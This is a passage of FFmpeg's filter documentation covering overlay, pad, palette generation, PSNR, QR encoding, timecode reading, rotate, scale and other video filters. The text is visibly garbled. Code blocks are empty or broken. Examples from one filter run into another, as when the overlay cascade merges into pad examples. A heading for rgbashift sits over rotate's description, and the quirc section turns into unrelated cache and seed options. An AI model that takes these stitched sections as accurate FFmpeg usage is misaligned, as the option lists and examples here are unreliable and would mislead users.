‘`yuv420p10`’

force YUV 4:2:0 10-bit planar output

‘`yuv422`’

‘`yuv422p10`’

force YUV 4:2:2 10-bit planar output

‘`yuv444`’

force YUV 4:4:4 8-bit planar output

‘`yuv444p10`’

force YUV 4:4:4 10-bit planar output

‘`rgb`’

force RGB 8-bit packed output

‘`gbrp`’

force RGB 8-bit planar output

‘`auto`’

automatically pick format

`alpha`

Set format of alpha of the overlaid video, it can be straight or
premultiplied. Default is straight.

The `x`, and `y` expressions can contain the following
parameters.

`main_w, W`
`main_h, H`

The main input width and height.

`overlay_w, w`
`overlay_h, h`

The overlay input width and height.

`x`
`y`

The computed values for x and y. They are evaluated for
each new frame.

`hsub`
`vsub`

horizontal and vertical chroma subsample values of the output
format. For example for the pixel format "yuv422p" hsub is 2 and
vsub is 1.

`n`

the number of input frame, starting from 0

`pos`

the position in the file of the input frame, NAN if unknown; deprecated,
do not use

`t`

The timestamp, expressed in seconds. It’s NAN if the input timestamp is unknown.

This filter also supports the [framesync](#framesync) options.

Note that the n, t variables are available only
when evaluation is done *per frame*, and will evaluate to NAN
when `eval` is set to ‘`init`’.

Be aware that frames are taken from each input video in timestamp
order, hence, if their initial timestamps differ, it is a good idea
to pass the two inputs through a setpts=PTS-STARTPTS filter to
have them begin in the same zero timestamp, as the example for
the movie filter does.

You can chain together more overlays but you should test the
efficiency of such approach.

#### [11.184.1 Commands](#toc-Commands-128)

This filter supports the following commands:

`x`
`y`

Modify the x and y of the overlay input.
The command accepts the same syntax of the corresponding option.

If the specified expression is not valid, it is kept at its current
value.

#### [11.184.2 Examples](#toc-Examples-102)

* Draw the overlay at 10 pixels from the bottom right corner of the main
  video:
  ```
  overlay=main_w-overlay_w-10:main_h-overlay_h-10

  ```

  Using named options the example above becomes:

  ```
  overlay=x=main_w-overlay_w-10:y=main_h-overlay_h-10

  ```
* Insert a transparent PNG logo in the bottom left corner of the input,
  using the `ffmpeg` tool with the `-filter_complex` option:

  ```
* Insert 2 different transparent PNG logos (second logo on bottom
  right corner) using the `ffmpeg` tool:
  ```
  ffmpeg -i input -i logo1 -i logo2 -filter_complex 'overlay=x=10:y=H-h-10,overlay=x=W-w-10:y=H-h-10' output

  ```
* Add a transparent color layer on top of the main video; `WxH`
  must specify the size of the main input to the overlay filter:
  ```
  color=color=red@.3:size=WxH [over]; [in][over] overlay [out]

  ```
* Play an original video and a filtered version (here with the deshake
  filter) side by side using the `ffplay` tool:
  ```
  ffplay input.avi -vf 'split[a][b]; [a]pad=iw*2:ih[src]; [b]deshake[filt]; [src][filt]overlay=w'

  ```

  The above command is the same as:

  ```
  ffplay input.avi -vf 'split[b], pad=iw*2[src], [b]deshake, [src]overlay=w'

  ```
* Make a sliding overlay appearing from the left to the right top part of the
  screen starting since time 2:

  ```
* Compose output by putting two input videos side to side:
  ```
  ffmpeg -i left.avi -i right.avi -filter_complex "
  nullsrc=size=200x100 [background];
  [0:v] setpts=PTS-STARTPTS, scale=100x100 [left];
  [1:v] setpts=PTS-STARTPTS, scale=100x100 [right];
  [background][left]       overlay=shortest=1       [background+left];
  [background+left][right] overlay=shortest=1:x=100 [left+right]
  "

  ```
* Mask 10-20 seconds of a video by applying the delogo filter to a section
  ```
  ffmpeg -i test.avi -codec:v:0 wmv2 -ar 11025 -b:v 9000k
  -vf '[in]split[split_main][split_delogo];[split_delogo]trim=start=360:end=371,delogo=0:0:640:480[delogoed];[split_main][delogoed]overlay=eof_action=pass[out]'
  masked.avi

  ```
* Chain several overlays in cascade:
  ```
  nullsrc=s=200x200 [bg];
  testsrc=s=100x100, split=4 [in0][in1][in2][in3];
  [in0] lutrgb=r=0, [bg]   overlay=0:0     [mid0];
  [in1] lutrgb=g=0, [mid0] overlay=100:0   [mid1];
  [in2] lutrgb=b=0, [mid1] overlay=0:100   [mid2];

  size is 640x480, and the top-left corner of the input video is placed at
  column 0, row 40
  ```
  pad=640:480:0:40:violet

  ```

  The example above is equivalent to the following command:

  ```
  pad=width=640:height=480:x=0:y=40:color=violet

  ```
* Pad the input to get an output with dimensions increased by 3/2,
  and put the input video at the center of the padded area:
  ```
  pad="3/2*iw:3/2*ih:(ow-iw)/2:(oh-ih)/2"

  ```
* Pad the input to get a squared output with size equal to the maximum
  value between the input width and height, and put the input video at
  the center of the padded area:
  ```
  pad="max(iw\,ih):ow:(ow-iw)/2:(oh-ih)/2"

  ```
* Pad the input to get a final w/h ratio of 16:9:
  ```
  pad="ih*16/9:ih:(ow-iw)/2:(oh-ih)/2"

  ```
* In case of anamorphic video, in order to set the output display aspect
  correctly, it is necessary to use sar in the expression,
  according to the relation:
  ```
  (ih * X / ih) * sar = output_dar
  X = output_dar / sar

  ```

  Thus the previous example needs to be modified to:

  ```
  pad="ih*16/9/sar:ih:(ow-iw)/2:(oh-ih)/2"

  ```
* Double the output size and put the input video in the bottom-right
  corner of the output padded area:
  ```
  pad="2*iw:2*ih:ow-iw:oh-ih"

  ```

### [11.188 palettegen](#toc-palettegen-1)

Generate one palette for a whole video stream.

It accepts the following options:

`max_colors`

Set the maximum number of colors to quantize in the palette.
Note: the palette will still contain 256 colors; the unused palette entries
will be black.

`reserve_transparent`

Create a palette of 255 colors maximum and reserve the last one for
transparency. Reserving the transparency color is useful for GIF optimization.
If not set, the maximum of colors in the palette will be 256. You probably want
to disable this option for a standalone image.
Set by default.

`transparency_color`

Set the color that will be used as background for transparency.

`stats_mode`

Set statistics mode.

It accepts the following values:

‘`full`’

Compute full frame histograms.

‘`diff`’

Compute histograms only for the part that differs from previous frame. This
might be relevant to give more importance to the moving part of your input if
the background is static.

‘`single`’

Compute new histogram for each frame.

Default value is full.

The filter also exports the frame metadata `lavfi.color_quant_ratio`
(`nb_color_in / nb_color_out`) which you can use to evaluate the degree of
color quantization of the palette. This information is also visible at
info logging level.

#### [11.188.1 Examples](#toc-Examples-104)

* Generate a representative palette of a given video using `ffmpeg`:
  ```
  ffmpeg -i input.mkv -vf palettegen palette.png

  ```

### [11.189 paletteuse](#toc-paletteuse)

Use a palette to downsample an input video stream.

The filter takes two inputs: one video stream and a palette. The palette must
be a 256 pixels image.

It accepts the following options:

`dither`

Select dithering mode. Available algorithms are:

‘`bayer`’

Ordered 8x8 bayer dithering (deterministic)

‘`heckbert`’

Dithering as defined by Paul Heckbert in 1982 (simple error diffusion).
Note: this dithering is sometimes considered "wrong" and is included as a
reference.

‘`floyd_steinberg`’

Floyd and Steingberg dithering (error diffusion)

‘`sierra2`’

Frankie Sierra dithering v2 (error diffusion)

‘`sierra2_4a`’

Frankie Sierra dithering v2 "Lite" (error diffusion)

‘`sierra3`’

Frankie Sierra dithering v3 (error diffusion)

‘`burkes`’

Burkes dithering (error diffusion)

‘`atkinson`’

Atkinson dithering by Bill Atkinson at Apple Computer (error diffusion)

‘`none`’

Disable dithering.

Default is sierra2\_4a.

`bayer_scale`

When bayer dithering is selected, this option defines the scale of the
pattern (how much the crosshatch pattern is visible). A low value means more
visible pattern for less banding, and higher value means less visible pattern
at the cost of more banding.

The option must be an integer value in the range [0,5]. Default is 2.

`diff_mode`

If set, define the zone to process

‘`rectangle`’

Only the changing rectangle will be reprocessed. This is similar to GIF
cropping/offsetting compression mechanism. This option can be useful for speed
if only a part of the image is changing, and has use cases such as limiting the
scope of the error diffusal `dither` to the rectangle that bounds the
moving scene (it leads to more deterministic output if the scene doesn’t change
much, and as a result less moving noise and better GIF compression).

Default is none.

`new`

Take new palette for each output frame.

`alpha_threshold`

Sets the alpha threshold for transparency. Alpha values above this threshold
will be treated as completely opaque, and values below this threshold will be
treated as completely transparent.

The option must be an integer value in the range [0,255]. Default is 128.

#### [11.189.1 Examples](#toc-Examples-105)

* Use a palette (generated for example with [palettegen](#palettegen)) to encode a GIF
  using `ffmpeg`:
  ```
  ffmpeg -i input.mkv -i palette.png -lavfi paletteuse output.gif

  ```

  ```

### [11.201 psnr](#toc-psnr-1)

Obtain the average, maximum and minimum PSNR (Peak Signal to Noise
Ratio) between two input videos.

This filter takes in input two input videos, the first input is
considered the "main" source and is passed unchanged to the
output. The second input is used as a "reference" video for computing
the PSNR.

Both video inputs must have the same resolution and pixel format for
this filter to work correctly. Also it assumes that both inputs
have the same number of frames, which are compared one by one.

The obtained average PSNR is printed through the logging system.

The filter stores the accumulated MSE (mean squared error) of each
frame, and at the end of the processing it is averaged across all frames
equally, and the following formula is applied to obtain the PSNR:

```
PSNR = 10*log10(MAX^2/MSE)

```

Where MAX is the average of the maximum values of each component of the
image.

The description of the accepted parameters follows.

`stats_file, f`

If specified the filter will use the named file to save the PSNR of
each individual frame. When filename equals "-" the data is sent to
standard output.

`stats_version`

Specifies which version of the stats file format to use. Details of
each format are written below.
Default value is 1.

`stats_add_max`

Determines whether the max value is output to the stats log.
Default value is 0.
Requires stats\_version >= 2. If this is set and stats\_version < 2,
the filter will return an error.

This filter also supports the [framesync](#framesync) options.

The file printed if stats\_file is selected, contains a sequence of
key/value pairs of the form key:value for each compared
couple of frames.

If a stats\_version greater than 1 is specified, a header line precedes
the list of per-frame-pair stats, with key value pairs following the frame
format with the following parameters:

`psnr_log_version`

The version of the log file format. Will match stats\_version.

`fields`

A comma separated list of the per-frame-pair parameters included in
the log.

A description of each shown per-frame-pair parameter follows:

`n`

sequential number of the input frame, starting from 1

`mse_avg`

Mean Square Error pixel-by-pixel average difference of the compared
frames, averaged over all the image components.

`mse_y, mse_u, mse_v, mse_r, mse_g, mse_b, mse_a`

Mean Square Error pixel-by-pixel average difference of the compared
frames for the component specified by the suffix.

`psnr_y, psnr_u, psnr_v, psnr_r, psnr_g, psnr_b, psnr_a`

Peak Signal to Noise ratio of the compared frames for the component
specified by the suffix.

`max_avg, max_y, max_u, max_v`

Maximum allowed value for each channel, and average over all
channels.

#### [11.201.1 Examples](#toc-Examples-108)

* For example:
  ```
  movie=ref_movie.mpg, setpts=PTS-STARTPTS [main];
  [main][ref] psnr="stats_file=stats.log" [out]

  ```

  On this example the input file being processed is compared with the
  reference file `ref_movie.mpg`. The PSNR of each individual frame
  is stored in `stats.log`.
* Another example with different containers:
  ```
  ffmpeg -i main.mpg -i ref.mkv -lavfi  "[0:v]settb=AVTB,setpts=PTS-STARTPTS[main];[1:v]settb=AVTB,setpts=PTS-STARTPTS[ref];[main][ref]psnr" -f null -

  ```

### [11.202 pullup](#toc-pullup-1)

Pulldown reversal (inverse telecine) filter, capable of handling mixed
hard-telecine, 24000/1001 fps progressive, and 30000/1001 fps progressive
content.

The pullup filter is designed to take advantage of future context in making
its decisions. This filter is stateless in the sense that it does not lock
onto a pattern to follow, but it instead looks forward to the following
fields in order to identify matches and rebuild progressive frames.

To produce content with an even framerate, insert the fps filter after
pullup, use `fps=24000/1001` if the input frame rate is 29.97fps,
`fps=24` for 30fps and the (rare) telecined 25fps input.

The filter accepts the following options:

`jl`
`jr`
`jt`
`jb`

These options set the amount of "junk" to ignore at the left, right, top, and
bottom of the image, respectively. Left and right are in units of 8 pixels,
while top and bottom are in units of 2 lines.
The default is 8 pixels on each side.

`sb`

Set the strict breaks. Setting this option to 1 will reduce the chances of
filter generating an occasional mismatched frame, but it may also cause an
excessive number of frames to be dropped during high motion sequences.
Conversely, setting it to -1 will make filter match fields more easily.
This may help processing of video where there is slight blurring between
the fields, but may also cause there to be interlaced frames in the output.
Default value is `0`.

`mp`

Set the metric plane to use. It accepts the following values:

‘`l`’

Use luma plane.

‘`u`’

Use chroma blue plane.

‘`v`’

Use chroma red plane.

This option may be set to use chroma plane instead of the default luma plane
for doing filter’s computations. This may improve accuracy on very clean
source material, but more likely will decrease accuracy, especially if there
is chroma noise (rainbow effect) or any grayscale video.
The main purpose of setting `mp` to a chroma plane is to reduce CPU
load and make pullup usable in realtime on slow machines.

For best results (without duplicated frames in the output file) it is
necessary to change the output frame rate. For example, to inverse
telecine NTSC input:

```
ffmpeg -i input -vf pullup -r 24000/1001 ...

```

### [11.203 qp](#toc-qp)

Change video quantization parameters (QP).

The filter accepts the following option:

`qp`

Set expression for quantization parameter.

The expression is evaluated through the eval API and can contain, among others,
the following constants:

known

1 if index is not 129, 0 otherwise.

qp

Sequential index starting from -129 to 128.

#### [11.203.1 Examples](#toc-Examples-109)

* Some equation like:
  ```
  qp=2+2*sin(PI*qp)

  ```

### [11.204 qrencode](#toc-qrencode)

Generate a QR code using the libqrencode library (see
<https://fukuchi.org/works/qrencode/>), and overlay it on top of the current
frame.

To enable the compilation of this filter, you need to configure FFmpeg with
`--enable-libqrencode`.

The QR code is generated from the provided text or text pattern. The
corresponding QR code is scaled and overlayed into the video output according to
the specified options.

In case no text is specified, no QR code is overlaied.

This filter accepts the following options:

`qrcode_width, q`
`padded_qrcode_width, Q`

Specify an expression for the width of the rendered QR code, with and without
padding. The qrcode\_width expression can reference the value set by the
padded\_qrcode\_width expression, and vice versa.
By default padded\_qrcode\_width is set to qrcode\_width, meaning that
there is no padding.

These expressions are evaluated for each new frame.

See the [qrencode Expressions](#qrencode_005fexpressions) section for details.

`x`
`y`

Specify an expression for positioning the padded QR code top-left corner. The
x expression can reference the value set by the y expression, and
vice.

By default x and y are set set to 0, meaning that the QR code
is placed in the top left corner of the input.

These expressions are evaluated for each new frame.

See the [qrencode Expressions](#qrencode_005fexpressions) section for details.

`case_sensitive, cs`

Instruct libqrencode to use case sensitive encoding. This is enabled by
default. This can be disabled to reduce the QR encoding size.

`level, l`

Specify the QR encoding error correction level. With an higher correction level,
the encoding size will increase but the code will be more robust to corruption.
Lower level is L.

It accepts the following values:

‘`L`’
‘`M`’
‘`Q`’
‘`H`’

`expansion`

Select how the input text is expanded. Can be either `none`, or
`normal` (default). See the [qrencode Text expansion](#qrencode_005ftext_005fexpansion)
section below for details.

`text`
`textfile`

Define the text to be rendered. In case neither is specified, no QR is encoded
(just an empty colored frame).

In case expansion is enabled, the text is treated as a text template, using the
qrencode expansion mechanism. See the [qrencode
Text expansion](#qrencode_005ftext_005fexpansion) section below for details.

`background_color, bc`
`foreground_color, fc`

Set the QR code and background color. The default value of
foreground\_color is "black", the default value of background\_color
is "white".

For the syntax of the color options, check the [(ffmpeg-utils)"Color"
section in the ffmpeg-utils manual](ffmpeg-utils.html#color-syntax).

#### [11.204.1 qrencode Expressions](#toc-qrencode-Expressions)

The expressions set by the options contain the following constants and functions.

`dar`

input display aspect ratio, it is the same as (w / h) \* sar

`duration`

the current frame’s duration, in seconds

`hsub`
`vsub`

horizontal and vertical chroma subsample values. For example for the
pixel format "yuv422p" hsub is 2 and vsub is 1.

`main_h, H`

the input height

`main_w, W`

the input width

`n`

the number of input frame, starting from 0

`pict_type`

a number representing the picture type

`qr_w, w`

the width of the encoded QR code

`rendered_qr_w, q`
`rendered_padded_qr_w, Q`

the width of the rendered QR code, without and without padding.

These parameters allow the q and Q expressions to refer to each
other, so you can for example specify `q=3/4*Q`.

`rand(min, max)`

return a random number included between min and max

`sar`

the input sample aspect ratio

`t`

timestamp expressed in seconds, NAN if the input timestamp is unknown

`x`
`y`

the x and y offset coordinates where the text is drawn.

These parameters allow the x and y expressions to refer to each
other, so you can for example specify `y=x/dar`.

#### [11.204.2 qrencode Text expansion](#toc-qrencode-Text-expansion)

If `expansion` is set to `none`, the text is printed verbatim.

If `expansion` is set to `normal` (which is the default),
the following expansion mechanism is used.

The backslash character ‘`\`’, followed by any character, always expands to
the second character.

Sequences of the form `%{...}` are expanded. The text between the
braces is a function name, possibly followed by arguments separated by ’:’.
If the arguments contain special characters or delimiters (’:’ or ’}’),
they should be escaped.

Note that they probably must also be escaped as the value for the `text`
option in the filter argument string and as the filter argument in the
filtergraph description, and possibly also for the shell, that makes up to four
levels of escaping; using a text file with the `textfile` option avoids
these problems.

The following functions are available:

`n, frame_num`

return the frame number

`pts`

Return the presentation timestamp of the current frame.

It can take up to two arguments.

The first argument is the format of the timestamp; it defaults to `flt` for
seconds as a decimal number with microsecond accuracy; `hms` stands for a
formatted [-]HH:MM:SS.mmm timestamp with millisecond accuracy.
`gmtime` stands for the timestamp of the frame formatted as UTC time;
`localtime` stands for the timestamp of the frame formatted as local time
zone time. If the format is set to `hms24hh`, the time is formatted in 24h
format (00-23).

The second argument is an offset added to the timestamp.

If the format is set to `localtime` or `gmtime`, a third argument may
be supplied: a `strftime` C function format string. By default,
YYYY-MM-DD HH:MM:SS format will be used.

`expr, e`

Evaluate the expression’s value and output as a double.

It must take one argument specifying the expression to be evaluated, accepting
the constants and functions defined in [qrencode\_expressions](#qrencode_005fexpressions).

`expr_formatted, ef`

Evaluate the expression’s value and output as a formatted string.

The first argument is the expression to be evaluated, just as for the expr function.
The second argument specifies the output format. Allowed values are ‘`x`’,
‘`X`’, ‘`d`’ and ‘`u`’. They are treated exactly as in the
`printf` function.
The third parameter is optional and sets the number of positions taken by the output.
It can be used to add padding with zeros from the left.

`gmtime`

The time at which the filter is running, expressed in UTC.
It can accept an argument: a `strftime` C function format string.
The format string is extended to support the variable %[1-6]N
which prints fractions of the second with optionally specified number of digits.

`localtime`

The time at which the filter is running, expressed in the local time zone.
It can accept an argument: a `strftime` C function format string.
The format string is extended to support the variable %[1-6]N
which prints fractions of the second with optionally specified number of digits.

`metadata`

Frame metadata. Takes one or two arguments.

The first argument is mandatory and specifies the metadata key.

The second argument is optional and specifies a default value, used when the
metadata key is not found or empty.

Available metadata can be identified by inspecting entries starting with TAG
included within each frame section printed by running `ffprobe
-show_frames`.

String metadata generated in filters leading to the qrencode filter are also
available.

`rand(min, max)`

return a random number included between min and max

#### [11.204.3 Examples](#toc-Examples-110)

### [11.205 quirc](#toc-quirc)

Identify and decode a QR code using the libquirc library (see
<https://github.com/dlbeer/quirc/>), and print the identified QR codes
positions and payload as metadata.

To enable the compilation of this filter, you need to configure FFmpeg with
`--enable-libquirc`.

For each found QR code in the input video, some metadata entries are added with
the prefix lavfi.quirc.N, where N is the index, starting from 0,
associated to the QR code.

A description of each metadata value follows:

`lavfi.quirc.count`

the number of found QR codes, it is not set in case none was found

`lavfi.quirc.N.corner.M.x`
`lavfi.quirc.N.coreer.M.y`

Set size in number of frames of internal cache, in range from `2` to
`512`. Default is `30`.

`seed`

Set seed for random number generator, must be an integer included between
`0` and `UINT32_MAX`. If not specified, or if explicitly set to
less than `0`, the filter will try to use a good random seed on a
best effort basis.

### [11.207 readeia608](#toc-readeia608)

Read closed captioning (EIA-608) information from the top lines of a video frame.

This filter adds frame metadata for `lavfi.readeia608.X.cc` and
`lavfi.readeia608.X.line`, where `X` is the number of the identified line
with EIA-608 data (starting from 0). A description of each metadata value follows:

`lavfi.readeia608.X.cc`

The two bytes stored as EIA-608 data (printed in hexadecimal).

  ```

### [11.208 readvitc](#toc-readvitc)

Read vertical interval timecode (VITC) information from the top lines of a
video frame.

The filter adds frame metadata key `lavfi.readvitc.tc_str` with the
timecode value, if a valid timecode has been detected. Further metadata key
`lavfi.readvitc.found` is set to 0/1 depending on whether
timecode data has been found or not.

This filter accepts the following options:

`scan_max`

Set the maximum number of lines to scan for VITC data. If the value is set to
`-1` the full video frame is scanned. Default is `45`.

`thr_b`

Set the luma threshold for black. Accepts float numbers in the range [0.0,1.0],
default value is `0.2`. The value must be equal or less than `thr_w`.

default value is `0.6`. The value must be equal or greater than `thr_b`.

#### [11.208.1 Examples](#toc-Examples-112)

* Detect and draw VITC data onto the video frame; if no valid VITC is detected,
  draw `--:--:--:--` as a placeholder:
  ```
  ffmpeg -i input.avi -filter:v 'readvitc,drawtext=fontfile=FreeMono.ttf:text=%{metadata\\:lavfi.readvitc.tc_str\\:--\\\\\\:--\\\\\\:--\\\\\\:--}:x=(w-tw)/2:y=400-ascent'

  ```

### [11.209 remap](#toc-remap)

Remap pixels using 2nd: Xmap and 3rd: Ymap input video stream.

Destination pixel at position (X, Y) will be picked from source (x, y) position
where x = Xmap(X, Y) and y = Ymap(X, Y). If mapping values are out of range, zero
value for pixel will be used for destination pixel.

Xmap and Ymap input video streams must be of same dimensions. Output video stream
will have Xmap/Ymap video stream dimensions.
Xmap and Ymap input video streams are 16bit depth, single channel.

`format`

Specify pixel format of output from this filter. Can be `color` or `gray`.
Default is `color`.

`fill`

Specify the color of the unmapped pixels. For the syntax of this option,
check the [(ffmpeg-utils)"Color" section in the ffmpeg-utils
manual](ffmpeg-utils.html#color-syntax). Default color is `black`.

### [11.210 removegrain](#toc-removegrain)

12

Same as mode 11.

13

Bob mode, interpolates top field from the line where the neighbours
pixels are the closest.

14

Bob mode, interpolates bottom field from the line where the neighbours
pixels are the closest.

15

Bob mode, interpolates top field. Same as 13 but with a more complicated
interpolation formula.

16

24

Similar as 23.

### [11.211 removelogo](#toc-removelogo)

Suppress a TV station logo, using an image file to determine which
pixels comprise the logo. It works by filling in the pixels that
comprise the logo with neighboring pixels.

The filter accepts the following options:

`filename, f`

Set the filter bitmap file, which can be any image format supported by
libavformat. The width and height of the image file must match those of the
video stream being processed.

Pixels in the provided bitmap image with a value of zero are not
considered part of the logo, non-zero pixels are considered part of
the logo. If you use white (255) for the logo and black (0) for the
rest, you will be safe. For making the filter bitmap, it is
recommended to take a screen capture of a black frame with the logo
visible, and then using a threshold filter followed by the erode
filter once or twice.

If needed, little splotches can be fixed manually. Remember that if
logo pixels are not covered, the filter quality will be much
reduced. Marking too many pixels as part of the logo does not hurt as
much, but it will increase the amount of blurring needed to cover over
the image and will destroy more information than necessary, and extra
pixels will slow things down on a large logo.

### [11.212 repeatfields](#toc-repeatfields)

This filter uses the repeat\_field flag from the Video ES headers and hard repeats
fields based on its value.

### [11.213 reverse](#toc-reverse)

Reverse a video clip.

Warning: This filter requires memory to buffer the entire clip, so trimming
is suggested.

#### [11.213.1 Examples](#toc-Examples-113)

* Take the first 5 seconds of a clip, and reverse it.
  ```
  trim=end=5,reverse

  ```

### [11.214 rgbashift](#toc-rgbashift)

Rotate video by an arbitrary angle expressed in radians.

The filter accepts the following options:

A description of the optional parameters follows.

`angle, a`

Set an expression for the angle by which to rotate the input video
clockwise, expressed as a number of radians. A negative value will
result in a counter-clockwise rotation. By default it is set to "0".

This expression is evaluated for each frame.

`out_w, ow`

Set the output width expression, default value is "iw".
This expression is evaluated just once during configuration.

`out_h, oh`

Set the output height expression, default value is "ih".
This expression is evaluated just once during configuration.

`bilinear`

Enable bilinear interpolation if set to 1, a value of 0 disables
it. Default value is 1.

`fillcolor, c`

Set the color used to fill the output area not covered by the rotated
image. For the general syntax of this option, check the
[(ffmpeg-utils)"Color" section in the ffmpeg-utils manual](ffmpeg-utils.html#color-syntax).
If the special value "none" is selected then no
background is printed (useful for example if the background is never shown).

Default value is "black".

The expressions for the angle and the output size can contain the
following constants and functions:

`n`

sequential number of the input frame, starting from 0. It is always NAN
before the first frame is filtered.

`t`

time in seconds of the input frame, it is set to 0 when the filter is
configured. It is always NAN before the first frame is filtered.

`hsub`
`vsub`

horizontal and vertical chroma subsample values. For example for the
pixel format "yuv422p" hsub is 2 and vsub is 1.

`in_w, iw`
`in_h, ih`

the input video width and height

`out_w, ow`
`out_h, oh`

the output width and height, that is the size of the padded area as
specified by the width and height expressions

`rotw(a)`
`roth(a)`

the minimal width/height required for completely containing the input
video rotated by a radians.

These are only available when computing the `out_w` and
`out_h` expressions.

#### [11.216.1 Examples](#toc-Examples-114)

* Rotate the input by PI/6 radians clockwise:
  ```
  rotate=PI/6

  ```
* Rotate the input by PI/6 radians counter-clockwise:
  ```
  rotate=-PI/6

  ```
* Rotate the input by 45 degrees clockwise:
  ```
  rotate=45*PI/180

  ```
* Apply a constant rotation with period T, starting from an angle of PI/3:
  ```
  rotate=PI/3+2*PI*t/T

  ```
* Make the input video rotation oscillating with a period of T
  seconds and an amplitude of A radians:
  ```
  rotate=A*sin(2*PI/T*t)

  ```
* Rotate the video, output size is chosen so that the whole rotating
  input video is always completely contained in the output:
  ```
  rotate='2*PI*t:ow=hypot(iw,ih):oh=ow'

  ```
* Rotate the video, reduce the output size so that no background is ever
  shown:
  ```
  rotate=2*PI*t:ow='min(iw,ih)/sqrt(2)':oh=ow:c=none

  ```

#### [11.216.2 Commands](#toc-Commands-137)

The filter supports the following commands:

Set the angle expression.
The command accepts the same syntax of the corresponding option.

If the specified expression is not valid, it is kept at its current
value.

### [11.217 sab](#toc-sab)

Apply Shape Adaptive Blur.

The filter accepts the following options:

`luma_radius, lr`

Set luma blur filter strength, must be a value in range 0.1-4.0, default
value is 1.0. A greater value will result in a more blurred image, and
in slower processing.

`luma_pre_filter_radius, lpfr`

Set luma pre-filter radius, must be a value in the 0.1-2.0 range, default
value is 1.0.

`luma_strength, ls`

be a value in the 0.1-100.0 range, default value is 1.0.

`chroma_radius, cr`

Set chroma blur filter strength, must be a value in range -0.9-4.0. A
greater value will result in a more blurred image, and in slower
processing.

`chroma_pre_filter_radius, cpfr`

Set chroma pre-filter radius, must be a value in the -0.9-2.0 range.

`chroma_strength, cs`

Set chroma maximum difference between pixels to still be considered,
must be a value in the -0.9-100.0 range.

Each chroma option value, if not explicitly specified, is set to the
corresponding luma option value.

### [11.218 scale](#toc-scale-1)

Scale (resize) the input video, using the libswscale library.

The scale filter forces the output display aspect ratio to be the same
of the input, by changing the output sample aspect ratio.

If the input image format is different from the format requested by
the next filter, the scale filter will convert the input to the
requested format.

#### [11.218.1 Options](#toc-Options-2)

The filter accepts the following options, any of the options supported
by the libswscale scaler, as well as any of the [framesync](#framesync) options.

See [(ffmpeg-scaler)the ffmpeg-scaler manual](ffmpeg-scaler.html#scaler_005foptions) for
the complete list of scaler options.

`width, w`
`height, h`

Set the output video dimension expression. Default value is the input
dimension.

If the width or w value is 0, the input width is used for
the output. If the height or h value is 0, the input height
is used for the output.

If one and only one of the values is -n with n >= 1, the scale filter
will use a value that maintains the aspect ratio of the input image,
calculated from the other specified dimension. After that it will,
however, make sure that the calculated dimension is divisible by n and
adjust the value if necessary.

If both values are -n with n >= 1, the behavior will be identical to
both values being set to 0 as previously detailed.

See below for the list of accepted constants for use in the dimension
expression.

`eval`

Specify when to evaluate width and height expression. It accepts the following values:

‘`init`’

Only evaluate expressions once during the filter initialization or when a command is processed.

‘`frame`’

Evaluate expressions for each incoming frame.

Default value is ‘`init`’.

`interl`

Set the interlacing mode. It accepts the following values:

‘`1`’

Force interlaced aware scaling.

‘`0`’

Do not apply interlaced scaling.

‘`-1`’

Select interlaced aware scaling depending on whether the source frames
are flagged as interlaced or not.

Default value is ‘`0`’.

`flags`

Set libswscale scaling flags. See
[(ffmpeg-scaler)the ffmpeg-scaler manual](ffmpeg-scaler.html#sws_005fflags) for the
complete list of values. If not explicitly specified the filter applies
the default flags.

`param0, param1`

Set libswscale input parameters for scaling algorithms that need them. See
[(ffmpeg-scaler)the ffmpeg-scaler manual](ffmpeg-scaler.html#sws_005fparams) for the
complete documentation. If not explicitly specified the filter applies
empty parameters.

`intent`

Set the ICC rendering intent to use when transforming between different color
spaces. It accepts the following values:

‘`perceptual`’

Use a perceptually guided tone and gamut mapping curve. The exact details of
the mapping used may change at any time and should not be relied on as stable.
This intent is recommended for final viewing of image/video content in typical
viewing settings.

‘`relative_colorimetric`’

Statically clip out-of-gamut colors using a colorimetric clipping curve which
attempts to find the colorimetrically least dissimilar in-gamut color. This
intent performs white point adaptation and black point adaptation. This is
the default. This intent is recommended wherever faithful color reproduction
is of the utmost importance, even at the cost of clipping.

‘`absolute_colorimetric`’

Hard clip out-of-gamut colors with no attempt at white or black point
reproduction. This intent will reproduce in-gamut colors 1:1 on the output
display as they would appear on the reference display, assuming the output
display is appropriately calibrated.

‘`saturation`’

Performs saturation mapping - that is, stretches the input color volume
directly onto the output color volume, in non-linear fashion that preserves the
original signal appearance as much as possible. This intent is recommended for
signal content evaluation, as it will not lead to any clipping. It is roughly
analogous to not performing any color mapping, although it still takes into
account the mastering display primaries and any differences in encoding TRC.

`size, s`

Set the video size. For the syntax of this option, check the
[(ffmpeg-utils)"Video size" section in the ffmpeg-utils manual](ffmpeg-utils.html#video-size-syntax).

`in_color_matrix`
`out_color_matrix`

Set in/output YCbCr color space type.

This allows the autodetected value to be overridden as well as allows forcing
a specific value used for the output and encoder.

If not specified, the color space type depends on the pixel format.

Possible values:

‘`auto`’

Choose automatically.

‘`bt709`’

Format conforming to International Telecommunication Union (ITU)
Recommendation BT.709.

‘`fcc`’

Set color space conforming to the United States Federal Communications
Commission (FCC) Code of Federal Regulations (CFR) Title 47 (2003) 73.682 (a).

‘`bt601`’
‘`bt470`’
‘`smpte170m`’

Set color space conforming to:

* ITU Radiocommunication Sector (ITU-R) Recommendation BT.601
* ITU-R Rec. BT.470-6 (1998) Systems B, B1, and G
* Society of Motion Picture and Television Engineers (SMPTE) ST 170:2004

‘`smpte240m`’

Set color space conforming to SMPTE ST 240:1999.

‘`bt2020`’

Set color space conforming to ITU-R BT.2020 non-constant luminance system.

`in_range`
`out_range`

Set in/output YCbCr sample range.

This allows the autodetected value to be overridden as well as allows forcing
a specific value used for the output and encoder. If not specified, the
range depends on the pixel format. Possible values:

‘`auto/unknown`’

Choose automatically.

‘`jpeg/full/pc`’

Set full range (0-255 in case of 8-bit luma).

‘`mpeg/limited/tv`’

Set "MPEG" range (16-235 in case of 8-bit luma).

`in_chroma_loc`
`out_chroma_loc`

Set in/output chroma sample location. If not specified, center-sited chroma
is used by default. Possible values:

‘`auto, unknown`’
‘`left`’
‘`center`’
‘`topleft`’
‘`top`’
‘`bottomleft`’
‘`bottom`’

`in_primaries`
`out_primaries`

Set in/output RGB primaries.

This allows the autodetected value to be overridden as well as allows forcing
a specific value used for the output and encoder. Possible values:

‘`auto`’

Choose automatically. This is the default.

‘`bt709`’
‘`bt470m`’
‘`bt470bg`’
‘`smpte170m`’
‘`smpte240m`’

`in_transfer`
`out_transfer`

Set in/output transfer response curve (TRC).

